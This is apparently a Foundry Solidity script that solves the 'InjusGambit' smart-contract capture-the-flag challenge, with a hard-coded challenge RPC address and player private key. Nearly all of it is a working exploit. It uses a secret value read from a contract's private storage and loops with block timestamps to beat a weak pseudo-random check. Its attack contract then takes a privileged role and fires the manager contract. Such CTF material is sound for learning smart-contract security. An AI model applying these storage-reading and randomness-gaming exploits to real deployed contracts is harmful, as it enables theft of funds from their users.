// SPDX-License-Identifier: MIT
// forge script SolveInjusGambit --broadcast --skip-simulation
pragma solidity ^0.8.26;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {Setup} from "../src/InjusGambit/Setup.sol";
import {Privileged} from "../src/InjusGambit/Privileged.sol";
import {ChallengeManager} from "../src/InjusGambit/ChallengeManager.sol";

contract SolveInjusGambit is Script {
    uint256 playerPrivateKey;
    address player;

    Setup setupInstance;
    Privileged privilegedInstance;
    ChallengeManager challengemanagerInstance;

    function setUp() external {
        string memory rpcUrl = "http://45.32.119.201:44445/6ab0b180-1b84-453e-9a97-db8b685a8d72";
        playerPrivateKey = 0x945387747a64bf0c6940c152531f55299119e976815ee3dc6a51496602d8addf;
        address setUpContract = 0xdD87ea2D945abc0A88A08E05ace19500900A4BB1;

        player = vm.addr(playerPrivateKey);
        vm.createSelectFork(rpcUrl);

        setupInstance = Setup(setUpContract);
        privilegedInstance = setupInstance.privileged();
        challengemanagerInstance = setupInstance.challengeManager();
    }

    function run() external {
        vm.startBroadcast(playerPrivateKey);
        console.log("Player Balance:", player.balance / 10**18);

        // uint slotIndex = 1;
        // bytes32 slotData = vm.load(address(challengemanagerInstance), bytes32(slotIndex));
        bytes32 slotData = 0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559; // to broadcast
        console.logBytes32(slotData);

        AttackContract attackInstance = new AttackContract{value: 5 ether}(setupInstance, privilegedInstance, challengemanagerInstance, slotData);
        
        while (true) {
            payable(0x0).transfer(1); // change block.timestamp()
            vm.warp(block.timestamp + 1); // to test in local
            attackInstance.attack();

            if (address(privilegedInstance.challengeManager()) == address(0)) {
                break;
            }
        }

        console.log("isSolved: ", setupInstance.isSolved());

        vm.stopBroadcast();
    }
}

contract AttackContract is Script {
    Setup setupInstance;
    Privileged privilegedInstance;
    ChallengeManager challengemanagerInstance;
    bytes32 slotData;

    constructor(Setup _setupInstance, Privileged _privilegedInstance, ChallengeManager _challengemanagerInstance, bytes32 _slotData) payable {
        setupInstance = _setupInstance;
        privilegedInstance = _privilegedInstance;
        challengemanagerInstance = _challengemanagerInstance;
        slotData = _slotData;
    }

    function attack() public {
        if ((uint256(keccak256(abi.encodePacked(address(this), block.timestamp))) % 4) > 1) {
            return;
        }

        console.log("gacha: ", uint256(keccak256(abi.encodePacked(address(this), block.timestamp))) % 4);

        challengemanagerInstance.approach{value: 5 ether}();
        
        uint256 Id = privilegedInstance.challengerCounter() - 1;

        for (uint256 i = 0; i<4; i++) {
            challengemanagerInstance.upgradeChallengerAttribute(Id, Id);
        }

        privilegedInstance.getRequirmenets(Id);

        challengemanagerInstance.challengeCurrentOwner(slotData);

        privilegedInstance.fireManager();
    }

}